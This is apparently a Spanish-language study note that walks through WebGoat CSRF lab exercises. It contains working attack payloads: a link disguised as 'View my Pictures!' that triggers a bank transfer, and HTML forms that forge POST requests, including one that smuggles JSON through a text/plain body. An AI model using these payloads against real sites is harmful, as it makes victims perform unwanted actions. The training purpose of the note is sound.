# Cross-Site Request Forgeries (CSRF)

Permite hacer peticiones a un sitio válido desde otro sitio.

## Ejemplo con GET request
```html
<a href="http://bank.com/transfer?account_number_from=123456789&account_number_to=987654321&amount=100000">View my Pictures!</a>
```

*********************************************************************

## Ejercicio 1

```html
<form accept-charset="UNKNOWN" id="basic-csrf-get" method="POST" name="form1" target="_blank" successcallback="" action="http://127.0.0.1:8080/WebGoat/csrf/basic-get-flag" enctype="application/json;charset=UTF-8">
	<input name="csrf" type="hidden" value="false">
	<input id="send_form" type="submit" name="submit">
</form>

<a href="http://127.0.0.1:8080/WebGoat/csrf/basic-get-flag">Este no funciona porque lo hace a través de GET</a>


<script>
	// Modo automatico
	document.addEventListener("DOMContentLoaded", function() {
		// document.getElementById("send_form").click();
	});
</script>
```

*******************************************************************

## Ejercicio 2

```html
<form class="attack-form" accept-charset="UNKNOWN" id="csrf-review" method="POST" name="review-form" successcallback="" action="http://127.0.0.1:8080/WebGoat/csrf/review">
	<input class="form-control" id="reviewText" name="reviewText" placeholder="Add a Review" type="text">
	<input class="form-control" id="reviewStars" name="stars" type="text">
	<input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
	<input type="submit" name="submit" value="Submit review">
</form>
```

*****************************************************************************

No podemos confiar en que no se hará uso de CSRF solamente porque el sitio emplea otro tipo de contenidos. Aunque el tipo de contenido lo detenga por defecto, el servidor debería estar preparado para detener este ataque. 

## Ejercicio 3

```html
<form action="http://127.0.0.1:8080/WebGoat/csrf/feedback/message" method="POST" enctype="text/plain">
	<input name='{"name":"WebGoat","email":"webgoat@webgoat.org","subject":"service","message":"WebGoat is the best!!","ignore_me":"' value='test"}' type='hidden'>
	<input type=submit value=Submit>
</form>
```

# Referencias
+ https://developer.mozilla.org/es/docs/Web/HTTP/Access_control_CORS